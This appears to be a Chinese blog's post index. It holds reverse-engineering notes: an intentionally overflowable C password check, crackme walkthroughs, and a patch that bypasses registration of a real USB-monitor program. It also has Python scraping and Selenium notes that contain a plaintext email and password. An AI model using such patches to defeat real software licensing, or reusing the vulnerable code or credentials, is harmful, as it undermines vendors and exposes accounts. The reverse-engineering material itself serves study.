strcmp(password,PASSWORD);\n\t\t\tstrcpy(buffer,password);\n\t\t\treturn authenticated;\n\t\t}\n\t\t \n\t\tint main(int argc, char* argv[])\n\t\t{\n\t\t\tint valid_flag = 0;\n\t\t\tchar password[1024];\n\t\t\tFILE *fp;\n\t\t\tif (!(fp=fopen(\"password.txt\",\"rw+\"))){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tfscanf(fp,\"%s\",password);\n\t\t\tvalid_flag = verify_password(password);\n\t\t\tif(valid_flag){\n\t\t\t\tprintf(\"incorrect password!\\n\");\n\t\t\t}else{\n\t\t\t\tprintf(\"Congratulation! You have passed the verification !\\n\");\n\t\t\t}\n\t\t\tSleep(-1);\n\t\t\treturn 1;\n\t\t}\n\n用OD调试：\n进入main()主函数，找到验证密码的函数调用位置，进入到函数具体代码处：\n![](http://i.imgur.com/jNcKasB.png)\n![](http://i.imgur.com/pQm0oAL.png)\n![](http://i.imgur.com/qBPQTjK.png)\n\n前面部分就是栈分配局部变量空间和初始化的过程，然后就是字符串的计较，最后是字符串的复制，分析可得栈溢出在这一部分，在指令008D1409处把函数的返回值（EAX储存的是返回值）存在了EBP-0XC处，下面就是strocpy的操作，char buffer[8]分配了八个字节的存储空间，但是password.txt的密码如图为24个字节，知错执行strcpy的时候，把buffer 附近的变量空间也给覆盖了，比如返回值的。以上过程如图所示\n![](http://i.imgur.com/9CBEnex.png)\n![](http://i.imgur.com/S0M3SMC.png)\n![](http://i.imgur.com/S0ptRZH.png)","tags":["逆向"],"categories":["逆向"]},{"title":"简单爬虫","url":"/2017/07/06/spider/","content":"\n-*- coding: utf-8 -*-    #可解决诸多编码问题，建议程序加上\n\n\t# import urllib2\n\t# import urllib\n\n### 1 .直接传输数据。利用urllib2\n\n\t# response =urllib2.urlopen('http://www.baidu.com')\n\t# print response.read()\n\t#首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header\n\t#request=urllib2.request(url)\n\t#response=urllib2.urlopen(request)\n\t#print response.read()\n\n### 2.post方式传递数据和get方式\n\n\t# post方式传送数据\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# request=urllib2.request('http://www.baidu.com',data)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\t#get方式出传送数据\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# url=\"http://www.baidu.com\"+\"?\"+data\n\t# request=urllib2.request(url)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\n### 3 .模拟登陆\n\n\t# 构建request实例的时候，加入header模拟登陆\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Referer':'https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&wd=&eqid=8815b85d0006fca2000000035915d702'}\n\t# request=urllib2.request('http://www.baidu.com',data,headers)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\n### 4.设置代理服务器\n\n\t# 设置代理服务器解决ip频繁访问被封问题\n\t# import urllib2\n\t# enable_proxy=True\n\t# proxy_handler=urllib2.ProxyHander({\"http\":'http://some-proxy.com:8080'})\n\t# null_proxy_handler=urllib2.build_opener(proxy_handler)\n\t# if enable_proxy:\n\t#   opener=urllib2.build_opener(proxy_handler)\n\t# else:\n\t#   opener=urllib2.build_opener(null_proxy_handler)\n\t#urllib2.install_opener(opener)\n\t#\n\n### 5.捕获url异常的写法\n\n\t#\n\t# import urllib2\n\t# request = urllib2.Request('http://www.baidu')\n\t# try:\n\t#     print urllib2.urlopen(request).read()\n\t# except urllib2.URLError, e:\n\t#     print e.reason\n\t#\n\n### 6.捕获httperror 的写法\n\n\t# import urllib2\n\t# req=urllib2.Request(\"http://blog.csdn.net/cqcre\")\n\t# try:\n\t#     print urllib2.urlopen(req)\n\t# except urllib2.HTTPError,e:\n\t#     print e.code\n\t#     print e.reason\n\t# except urllib2.URLError,e:\n\t#     print e.reason\n\t#requires 库的使用\n\t# import requests\n\t# s = requests.session()\n\t# s.headers.update({'x-test': 'true'})\n\t# r = s.get('http://httpbin.org/headers', headers={'x-test2': 'true'})\n\t# print r.text\n\n ### 7.正则匹配\n\n\tExample 1\n\t# import re\n\t# a='ba91c'\n\t# pattern=re.compile(r\"a\\d{1,2}c\")\n\t# if  re.match(pattern,a):  #开头必须匹配\n\t#     print 'success'\n\t# if re.search(pattern,a):  #开头不要求匹配\n\t#     print 'research success '\n\t# pattern=re.compile(r\"\\d+\")\n\t# print re.split(pattern,a)\n\t# print re.findall(pattern,a)\n\tExample 2\n\t# import urllib\n\t# import json\n\t# import urllib2\n\t# import re\n\t# from bs4 import BeautifulSoup\n\t# page=1\n\t# url = 'http://www.qiushibaike.com/hot/page/' + str(page)\n\t# headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}\n\t# try:\n\t# \treq=urllib2.Request(url,headers=headers)\n\t# \tresponse=urllib2.urlopen(req)\n\t# \tprint response.code\n\t# \tcontent=response.read().decode('utf-8')\n\t# \tpattern = re.compile(r'<a href=.*? target=.*? title=.*?>.*?<h2>(.*?)</h2>.*?<span>(.*?)</span>.*?<i class=\"number\">(.*?)</i>', re.S)\n\t# \titems=re.findall(pattern,content)\n\t# \tfor item in items:\n\t# \t\tprint json.dumps(item[0], encoding=\"UTF-8\", ensure_ascii=False),json.dumps(item[1], encoding=\"UTF-8\", ensure_ascii=False),json.dumps(item[2], encoding=\"UTF-8\", ensure_ascii=False)\n\t# except urllib2.URLError,e:\n\t# \tif hasattr(e,\"code\"):\n\t# \t\tprint e.code\n\t# \tif hasattr(e,\"reason\"):\n\t# \t\tprint e.reason\n\n### 8.时间戳\n\n\t# from datetime import datetime\n\t# import time\n\t# a =datetime.now()\n\t# #sleep(10)\n\t# time.sleep(10)\n\t# b=datetime.now()\n\t# print (b-a).seconds\n\n### 9.beautifulsoup 的学习\n\n\t# from bs4 import BeautifulSoup\n\t# html = \"\"\"\n\t# <html><head><title>The Dormouse's story</title></head>\n\t# <body>\n\t# <p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n\t# <p class=\"story\">Once upon a time there were three little sisters; and their names were\n\t# <a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"><!-- Elsie --></a>,\n\t# <a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\">Lacie</a> and\n\t# <a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\">Tillie</a>;\n\t# and they lived at the bottom of a well.</p>\n\t# <p class=\"story\">...</p>\n\t# \"\"\"\n\t# soup=BeautifulSoup(html,'lxml')\n\t# for p in soup.p.next_siblings :  #同级兄弟节点\n\t#     print p\n\t\n\t# print soup.prettify()\n\t# print soup.title\n\t# print soup.title.string\n\t# for string in  soup.body.stripped_strings:\n\t# \tprint string\n\t# print soup.a\n\t# print soup.a.string\n\t# print soup.head.contents\n\t# for children in  soup.head.children:\n\t# \tprint children\n\t\n\t#soup.findall()\n\t#还可以传入关键词如果一个指定名字的参数不是搜索内置的参数名,\n\t#搜索时会把该参数当作指定名字tag的属性来搜索,例如如果包含一\n\t#个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性\n\t#for examle  soup.findall(id=\"link2\") or soup.findall(href=re.compile('elsie')\n\t#print soup.find_all(attrs={\"name\": \"dromouse\"})\n\t#soup.select()\n\t# print soup.select('title')  #通过标签名\n\t# print soup.select('.story') #通过类名\n\t# print soup.select(\"#link1\") #通过id\n\t# print soup.select(\"p #link1\") #标签名和id 的组合\n\t# print soup.select('a[class=\"sister\"]')#标签和类\n\n### 10.selenium测试  \n\n\t# -*- coding: utf-8 -*-  \n\t# from selenium import webdriver\n\t# browser=webdriver.Chrome()\n\t# browser.get('http://www.baidu.com/')\n\t# import sys\n\t# reload(sys)\n\t# sys.setdefaultencoding('utf-8')\n\t# from selenium import webdriver\n\t# from selenium.webdriver.common.keys import Keys\n\t#\n\t# driver = webdriver.Chrome()\n\t# driver.get(\"http://www.python.org\")\n\t# assert \"Python\" in driver.title\n\t# elem = driver.find_element_by_name(\"q\")\n\t# elem.send_keys(\"pycon\")\n\t# elem.send_keys(Keys.RETURN)\n\t# print driver.page_source\n\n### 11.  selenium 优化\n\n以登陆腾讯哈勃分析系统为例\n\n主要的优化在于把time.sleep()这种强制等待多少秒换成隐式等待和显式等待。\n所谓隐式等待就是\ndriver.implicitly_wait(30) 设置最大超时时间为30秒，当页面加载完毕以后，要查找的元素找到即进行下一步，而不必强行等待多少秒，所谓的显式等待就是等你所要查找的元素出现后进行下一步，WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator))  。\n\n\t# -*- coding: utf-8 -*-\n\t# 登陆腾讯哈勃分析系统\n\timport time\n\timport json\n\tfrom selenium import webdriver\n\tfrom selenium.webdriver.support.wait import WebDriverWait\n\tfrom selenium.webdriver.support import expected_conditions as EC\n\tfrom selenium.webdriver.common.by import By\n\tdriver = webdriver.Chrome()\n\ttime.sleep(3)\n\tdriver.get('https://habo.qq.com/')\n\t#time.sleep(3)\n\tdriver.implicitly_wait(30)\n\t#driver.implicitly_wait(30)\n\tdriver.find_element_by_id(\"nologin\").click()\n\t# time.sleep(5)\n\t#driver.implicitly_wait(30)\n\tdriver.switch_to_frame('login_ifr')\n\t# print driver.page_source.encode('utf-8')\n\tdriver.find_element_by_css_selector(\"#img_out_1031652154\").click()\n\t# time.sleep(3)\n\t#driver.implicitly_wait(30)\n\tfor i in range(1200,1300):\n\t    filename='F:\\\\sample_malware\\\\1\\\\pdf\\\\'+str(i)+'.pdf'\n\t    driver.find_element_by_css_selector(\"#file_upload2\").send_keys(filename)\n\t    #time.sleep(15)\n\t    #driver.implicitly_wait(30)\n\t    time.sleep(3)\n\t    print 'pdf'+str(i)\n\t    # try:\n\t    #     driver.find_element_by_id('file_upload_fail')\n\t    #     a = True\n\t    # except:\n\t    #     a = False\n\t    # if a == False:\n\t    \t#time.sleep(6)\n\t    locator=(By.ID,\"detail_frame\")\n\t    # driver.implicitly_wait(30)\n\t    #driver.find_element_by_xpath(\".//*[@id='detail_frame']/div[1]/div/div[1]/div[1]\")\n\t    try:\n\t    \tWebDriverWait(driver, 60).until(EC.presence_of_element_located(locator))\n\t    \tdriver.back()\n\t    except:\n\t    \tdriver.refresh()\n\t    \n\t    # else:\n\t    # \tpass\n\t    #     #driver.refresh()\n\n遇到的问题：\n\n注意:\nFrame/Iframe原因定位不到元素：\n\n1.这个是最常见的原因，首先要理解下frame的实质，frame中实际上是嵌入了另一个页面，而webdriver每次只能在一个页面识别，因此需要先定位到相应的frame，对那个页面里的元素进行定位。 例如：如果iframe有name或id的话，直接使用switch_to_frame(\"name值\")或switch_to_frame(\"id值\")。如下：\n\n\tdriver=webdriver.Firefox()\n\tdriver.get(r'http://www.126.com/')\n\tdriver.switch_to_frame('x-URS-iframe')  #需先跳转到iframe框架\n\tusername=driver.find_element_by_name('email')\n\tusername.clear()\n\n如果iframe没有name或id的话，则可以通过下面的方式定位：\n\n\t#先定位到iframe\n\telementi= driver.find_element_by_class_name('APP-editor-iframe')\n\t#再将定位对象传给switch_to_frame()方法\n\tdriver.switch_to_frame(elementi) \n\n如果完成操作后，可以通过switch_to.parent_content()方法跳出当前iframe，或者还可以通过switch_to.default_content()方法跳回最外层的页面\n\n2.关于窗口的切换用到switch_to_window(handle)  方法\n\n例如：\n\n    all_handles = driver.window_handles #获取所有窗口句柄\n    for handle in all_handles:\n        if handle != now_handle:\n            print handle    #输出待选择的窗口句柄\n            driver.switch_to_window(handle)\n            time.sleep(5)\n            try:\n                filename=driver.find_element_by_xpath(\".//*[@id='baseinfo']/div/table/tbody/tr[1]/td[2]/p\").text+\".html\"\n                with open(filename, 'w') as fp:\n                    fp.write(driver.page_source.encode('utf-8'))\n            except:\n                print str(j)+str(i)\n            time.sleep(5)\n            driver.close() #关闭当前窗口\n    time.sleep(3)\n    print now_handle   #输出主窗口句柄\n    driver.switch_to_window(now_handle) #返回主窗口\n    time.sleep(5)\n\n\n\n### 12.requires库的使用\n\n两种模拟登陆的方式：\n\n1. 构建请求的表单数据来登录\n\n\t\t# -*- coding: utf-8 -*-\n\t\t# import requests\n\t\t# import ConfigParser\n\t\t# import json\n\t\t# cf = ConfigParser.ConfigParser()\n\t\t# cf.read('config.ini')\n\t\t# username = cf.get('info', 'username')\n\t\t# password = cf.get('info', 'password')\n\t\t# csrfmiddlewaretoken=cf.get('info','csrfmiddlewaretoken')\n\t\t# ##g-recaptcha-response=cf.get('info','g-recaptcha-response')\n\t\t# session = requests.session()\n\t\t# login_data = {'username': username, 'password': password,'csrfmiddlewaretoken':csrfmiddlewaretoken,'g-recaptcha-response':cf.get('info','g-recaptcha-response')}\n\t\t# header = {\n\t\t#     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36',\n\t\t#     'Host': 'malwr.com',\n\t\t#     'Referer': 'https://malwr.com/account/login/'\n\t\t# }\n\t\t# # r = session.get('http://malwr.com/')  # 实现验证码登陆\n\t\t# r = session.post('https://malwr.com/account/login/', data=login_data, headers=header)\n\t\t\n\t\t# with open('123.html', 'w') as fp:\n\t\t#     fp.write(r.content)\n\n\n2. 构建cookies来模拟登陆\n3. \n\t\t# -*- coding: utf-8 -*-\n\t\timport requests\n\t\timport ConfigParser\n\t\timport json\n\t\tcf = ConfigParser.ConfigParser()\n\t\tcf.read('config.ini')\n\t\tcookies = cf.items('cookies')\n\t\tcookies = dict(cookies)\n\t\theader = {\n\t\t    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',\n\t\t    'Host': 'malwr.com',\n\t\t    'Referer': 'https://malwr.com/account/login/'\n\t\t}\n\t\tsession = requests.session()\n\t\tr = session.get('http://malwr.com/analysis/', cookies=cookies,headers=header)  # 实现验证码登陆\n\t\t\n\t\twith open('login.html', 'w') as fp:\n\t\t    fp.write(r.content)\n","tags":["python"],"categories":["python"]},{"title":"win10添加右键菜单","url":"/2017/07/06/右键菜单/","content":"\n\n\n1.win +R 打开运行窗口，输入regedit，进入注册表。\n\n2.打开HKEY_CLASSES_ROOT\\*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。\n\n3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为\"E:\\Sublime Text 3\\sublime_text.exe\" \"%1\" \n确定即可。\n ![](http://i.imgur.com/nQzB0OO.png)\n\n后续：\n邮件发送到菜单\n\n1.运行  shell:sendto\n\n2.新建你要添加到发送到的程序快捷方式即可\n","tags":["杂学"],"categories":["杂学"]},{"title":"破解实例2","url":"/2017/07/06/破解实例2/","content":"\n一、样本基本信息\n\n破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq\n\n二、分析过程\n\n首先打开样本程序，得到关键字符串“try again”，如下\n![](http://i.imgur.com/ihhEPri.png)\n\n打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串。\n\n ![](http://i.imgur.com/flE7THU.png)\n\n双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。\n\n![](http://i.imgur.com/4u7teoc.png)![](http://i.imgur.com/yf2icp9.png)![](http://i.imgur.com/vzzRbj2.png)\n\n打开OD找到这个位置。\n此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。\n\n\n![](http://i.imgur.com/epbIVI8.png)![](http://i.imgur.com/OWmZPEz.png)\n有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下：\n\n方法1：输入“`mddggzdl” ，显示\"very good\".\n\n\n![](http://i.imgur.com/TMfyDA5.png)\n\n方法2：分析断点附近的指令，单步调试发现跳转指令在指令“0040109A”处 当跳转实现时，跳转到\"success\" ,当跳转没有实现时，跳转到“fail” 。我们只需要修改这个跳转条件，让它的跳转调到\"success\"即可。分析指令我们知道把JE 改为“JNE”即可。如图：右键汇编，改JE为JNE，然后汇编，右键复制到可执行文件-所有修改-全部复制，在弹框中右键保存文件，输入保存的文件名，保存即可。\n\n![](http://i.imgur.com/cyP7RUh.png)![](http://i.imgur.com/EfRZ9kk.png)![](http://i.imgur.com/O5tNd2b.png)","tags":["逆向"],"categories":["逆向"]},{"title":"破解实例3","url":"/2017/07/06/破解实例3/","content":"\n\n一、样本基本信息\n\n破解样本 链接为 http://pan.baidu.com/s/1bp1YnT1\n\n二、分析过程\n\n首先打开样本程序，得到关键字符串“序列号错误，再来一次！”，如下\n\n ![](./img/pojie3/1.png) \n![](http://i.imgur.com/1iVDBXu.png)\n\n打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串。\n\n ![](./img/pojie3/3.png)\n\n发现并没有关键字符串，然后我们打开导入表，发现导入表中有istrcmpA函数，这是一个很重要的函数，比较两个字符串是否相等，双加该字符串，得到IDA-View的导入表中IstrcmpA的位置，鼠标放在函数名的位置，按下X键，查找调用该函数的位置，点击进去，发现调用这个函数的位置，分析可知此处就是输入字符串进行比较的位置。\n\n![](http://i.imgur.com/pyR9pcq.png) \n\n![](http://i.imgur.com/9RHvbDN.png)\n\n打开OD找到这个位置。\n此时我们在这个位置下断点运行程序，输入字符串“111111”，和“222222”，发现在堆栈区的字符串为“2009”和”222222“，故猜测字符串”111111“经过运算，得到2009然后和222222，进行比较，如果相等，即成功。实际测试发现果然如此。\n  ![](http://i.imgur.com/bEuszv9.png)\n  ![](http://i.imgur.com/Pg80kAA.png)\n  ![](http://i.imgur.com/TBQZMkt.png)\n","tags":["逆向"],"categories":["逆向"]},{"title":"破解实例1","url":"/2017/07/06/破解实例1/","content":"\n一、样本基本信息\n\nU盘监控器破解实例链接：http://pan.baidu.com/s/1dEDiSYt 密码：srpe\n\n二、分析过程\n\n首先打开u盘监控器，获取注册关键信息， 如下的\"注册失败”即为关键信息\n![](http://i.imgur.com/MyGKNqI.png)![](http://i.imgur.com/8Gbifid.png)\n\n使用FlexHEX获取该字符串的文件偏移地址，所谓文件偏移地址就是\n文件偏移地址是指数据在PE文件中的地址，是文件在磁盘上存放时相对于文件开头的偏移。文件偏移地址从pe文件的第一个字节开始计数，起始值为0。用十六进制工具（如WINHEX）打开文件所显示的地址就是文件偏移地址。如图\"注册失败\"的文件偏移地址为0x00081A79 \n\n![](http://i.imgur.com/QphmGr2.png)\n\n使用OD获取该字符串的内存地址\n内存地址等于装载基址+文件偏移地址\n装载基址可以通过OD查看，如图可以看到0x00400000就是装载基址。即该字符串地址常量为0x481a79,右键查找/常量  输入0x481a79 可以找到字符串所在位置，对应内存地址为0x00405d2d \n\n![](http://i.imgur.com/TLYbq9H.png)\n\n使用W32DASM  找到该地址的上一个判断语句的位置。,如图，记下地址0x405cd2\n\n![](http://i.imgur.com/i6lv5P1.png)![](http://i.imgur.com/RZjGkZP.png)\n\n在OD中找到此地址位置，右键汇编于此处，jg 改为jl 然后复制到二进制文件，保存文件即可。\n\n![](http://i.imgur.com/wAmnWPj.png)","tags":["逆向"],"categories":["逆向"]},{"title":"hexo 搭建博客(github)","url":"/2017/07/05/搭建博客/","content":"#### 步骤如下\n1、新建仓库 username.github.io \n\n2、新建read.me\n\n3、安装node.js\n4、安装git\n\n5、安装hexo\n\n6、修改hexo 的配置文件，和github仓库建立关联\n\n7、购买域名，绑定username.github.io\n\n8、发布博客 hexo clean &&hexo g &&hexo d\n\n9、修改主题 [详见](https://www.haomwei.com/technology/maupassant-hexo.html)\n\n10、加入评论和订阅功能 （gittalk）\n\n","tags":["杂学"],"categories":["杂学"]}]